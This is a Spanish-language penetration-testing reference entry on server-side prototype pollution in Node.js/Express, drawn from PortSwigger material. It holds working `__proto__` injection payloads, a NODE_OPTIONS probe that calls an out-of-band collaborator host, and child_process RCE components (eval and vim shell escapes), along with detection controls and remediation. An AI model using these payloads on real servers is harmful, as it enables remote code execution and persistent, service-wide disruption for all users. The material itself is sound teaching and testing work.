---
clase: inyeccion
tech: nodejs-express
cwe: CWE-1321
cvss: 9.8 # [derivado] RCE en Node.js; sin CVE ni recompensa en la fuente
payload: |
  # ---- DETECCION 1: REFLEXION (no destructiva) ----
  # Peticion LITERAL de la fuente:
  POST /user/update HTTP/1.1
  Host: vulnerable-website.com
  ...
  { "user":"wiener", "firstName":"Peter", "lastName":"Wiener", "__proto__":{ "foo":"bar" } }
  #
  # Respuesta LITERAL (el 'foo':'bar' aparece donde no se envio como propiedad propia):
  #   HTTP/1.1 200 OK
  #   { "username":"wiener", "firstName":"Peter", "lastName":"Wiener", "foo":"bar" }
  # (NOTA: la fuente envia "user" y la respuesta muestra "username". Asi lo imprime.)
  #
  # Por que funciona - codigo LITERAL de la fuente. for...in RECORRE las propiedades
  # heredadas:
  const myObject = { a: 1, b: 2 }; // pollute the prototype with an arbitrary property Object.prototype.foo = 'bar'; // confirm myObject doesn't have its own foo property myObject.hasOwnProperty('foo'); // false // list names of properties of myObject for(const propertyKey in myObject){ console.log(propertyKey); } // Output: a, b, foo
  #
  # ---- DETECCION 2: SOBRESCRIBIR EL CODIGO DE ESTADO ----
  # Propiedad: 'status'. Restriccion LITERAL de la fuente:
  #   'You must choose a status code in the 400-599 range.'
  # Respuesta de ejemplo LITERAL:
  #   { "error": { "success": false, "status": 401, "message": "You do not have permission to access this resource." } }
  # Codigo de http-errors que lo permite (LITERAL, con el punto y coma perdido en el render):
  #   err = arg status = err.status || err.statusCode || status
  #
  # ---- DETECCION 3: 'json spaces' (Express) ----
  # Propiedad: 'json spaces'. Cambia el FORMATEO del JSON de respuesta.
  # Cita LITERAL: 'Although the prototype pollution has been fixed in Express 4.17.4,
  # websites that haven't upgraded may still be vulnerable.'
  #
  # ---- DETECCION 4: SOBRESCRIBIR EL CHARSET (UTF-7) ----
  # UTF-7 de 'foo' es '+AGYAbwBv-'. Peticiones LITERALES de la fuente:
  { "sessionId":"0123456789", "username":"wiener", "role":"+AGYAbwBv-" }
  { "sessionId":"0123456789", "username":"wiener", "role":"default", "__proto__":{ "content-type": "application/json; charset=utf-7" } }
  # Resultado esperado tras la pollution:
  #   { "sessionId":"0123456789", "username":"wiener", "role":"foo" }
  #
  # ---- IDENTIFICACION DE RCE VIA COLLABORATOR ----
  # Payload LITERAL de la fuente (con su propio escapado):
  "__proto__": { "shell":"node", "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com" }
  #
  # ---- RCE: componentes LITERALES (la fuente NO da un payload unico combinado) ----
  # child_process.fork():
  "execArgv": [ "--eval=require('<module>')" ]
  # child_process.execSync():
  "shell":"vim", "input":":! <command>\n"
  # Nota LITERAL de la fuente: Vim requiere el salto de linea final.
precondicion: "Aplicacion Node.js que fusiona entrada JSON en un objeto sin sanear claves. Para el RCE, que la aplicacion invoque child_process (fork o execSync). ADVERTENCIA LITERAL de la fuente, que cambia por completo el riesgo de probar: una vez envenenado el prototipo del lado servidor, 'this change persists for the entire lifetime of the Node process'."
como_se_descubre: |
  Orden de coste y RIESGO creciente. La fuente clasifica las tres primeras tecnicas
  como NO DESTRUCTIVAS, y esa distincion es la mas importante de esta pagina:
  1. REFLEXION: enviar '__proto__':{'foo':'bar'} y buscar 'foo' en la respuesta.
     Inocuo.
  2. 'status': fuerza un codigo de estado del rango 400-599. Reversible.
  3. 'json spaces': cambia el formateo. La fuente indica que se puede DESACTIVAR
     restaurando el valor por defecto.
  4. 'content-type' con charset utf-7: cambia la decodificacion.
  Herramienta: extension 'Server-Side Prototype Pollution Scanner' del BApp Store.
  Flujo LITERAL: seleccionar items en Proxy > HTTP history, despues
  Extensions > Server-Side Prototype Pollution Scanner > Server-Side Prototype Pollution.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: cuerpo con "__proto__":{"foo":"bar"}  -> 'foo':'bar' aparece en la respuesta
  # B: cuerpo con "foo":"bar" como propiedad NORMAL -> tambien aparece
  # El par A/B es imprescindible y sutil: si B tambien se refleja, la aplicacion
  # simplemente hace eco de lo que recibe y A NO prueba pollution. Hay que confirmar
  # que 'foo' NO era una propiedad propia, que es justo lo que el codigo de la fuente
  # demuestra con hasOwnProperty.
  # C: tras A, una peticion LIMPIA en una sesion nueva -> si 'foo' sigue apareciendo,
  #    el prototipo del PROCESO esta envenenado (ver advertencia de persistencia).
mata: |
  - Claves saneadas con allowlist antes de la fusion.
  - Express 4.17.4 o posterior (mata la via de 'json spaces').
  - Node con --disable-proto=delete o --disable-proto=throw. ADVERTENCIA LITERAL de la
    fuente: la tecnica del CONSTRUCTOR esquiva estas banderas.
  - La aplicacion no invoca child_process -> no hay RCE, aunque si pollution.
  - El control B tambien se refleja -> es eco de entrada, no pollution.
fuente: "https://portswigger.net/web-security/prototype-pollution/server-side (whitepaper atribuido por la pagina a Gareth Heyes; la pagina no da fecha). Peticiones, propiedades, codigo y la advertencia de persistencia literales. Productos nombrados: Node.js, Express ('json spaces' corregido en 4.17.4), body-parser, http-errors, _http_incoming, child_process, Vim y ex. Sergey Bobrov citado por un repositorio de documentacion de CSPP. Sin CVE ni recompensas."
confianza: media
fecha: 2026-11-02
---
# [INYECCIÓN] Server-side prototype pollution en Node.js — detección no destructiva y RCE

## Principio
La misma clase de fallo que en el cliente, pero en el servidor: si la aplicación fusiona
JSON del usuario en un objeto sin sanear claves, el atacante escribe en
`Object.prototype` del proceso Node.

La diferencia que lo cambia todo está en la advertencia literal de la fuente:

> *"this change persists for the entire lifetime of the Node process"*

No es una pollution por petición. Es un cambio global que afecta a todas las peticiones
de todos los usuarios hasta que el proceso se reinicie. Eso hace que **probar** sea en sí
mismo una acción con impacto, y es la razón de que la fuente clasifique explícitamente
qué técnicas son no destructivas.

## Detección, en orden de riesgo creciente
**1 — Reflexión** (inocua). La técnica base:

```http
POST /user/update HTTP/1.1
Host: vulnerable-website.com

{ "user":"wiener", "firstName":"Peter", "lastName":"Wiener", "__proto__":{ "foo":"bar" } }
```
→ `{ "username":"wiener", "firstName":"Peter", "lastName":"Wiener", "foo":"bar" }`

Funciona porque `for...in` recorre las propiedades **heredadas**:

```javascript
const myObject = { a: 1, b: 2 }; Object.prototype.foo = 'bar'; myObject.hasOwnProperty('foo'); // false for(const propertyKey in myObject){ console.log(propertyKey); } // Output: a, b, foo
```

**2 — `status`** (reversible). Fuerza un código de estado, con la restricción literal:
*"You must choose a status code in the 400-599 range."*

**3 — `json spaces`** (reversible). Cambia el formateo del JSON de respuesta, y la fuente
indica que se desactiva restaurando el valor por defecto. Nota: *"Although the prototype
pollution has been fixed in Express 4.17.4, websites that haven't upgraded may still be
vulnerable."*

**4 — `content-type` con charset UTF-7.** El UTF-7 de `foo` es `+AGYAbwBv-`:

```json
{ "sessionId":"0123456789", "username":"wiener", "role":"+AGYAbwBv-" }
{ "sessionId":"0123456789", "username":"wiener", "role":"default", "__proto__":{ "content-type": "application/json; charset=utf-7" } }
```

Un valor que antes era inerte se decodifica a `foo` — elegante, porque demuestra pollution
sin provocar ningún error.

## El control que evita el falso positivo
Si la aplicación simplemente hace eco de lo que recibe, la reflexión de `foo` no prueba
nada. Hay que enviar `"foo":"bar"` como propiedad **normal** y comprobar que también se
refleja: si lo hace, el primer test no era concluyente. Es exactamente lo que el código de
la fuente demuestra con `hasOwnProperty`.

## RCE
La fuente da los componentes y **no** un payload único combinado, así que no lo construyo:

```json
"execArgv": [ "--eval=require('<module>')" ]
```
```json
"shell":"vim", "input":":! <command>\n"
```

Con la nota literal de que Vim requiere el salto de línea final. Y para identificar
objetivos capaces de RCE sin ejecutar nada:

```json
"__proto__": { "shell":"node", "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com" }
```

## Impacto
Ejecución remota de código en el servidor. Y aun sin RCE, la persistencia por proceso
convierte cualquier pollution en un efecto global: sobrescribir `status` o `content-type`
para todos los usuarios es denegación de servicio.

## Remediación
De la fuente: actualizar Express más allá de 4.17.4, y usar las banderas
`--disable-proto=delete` o `--disable-proto=throw` — **con la advertencia explícita de que
la técnica del constructor las esquiva**. La corrección real sigue siendo sanear las
claves con allowlist antes de fusionar.
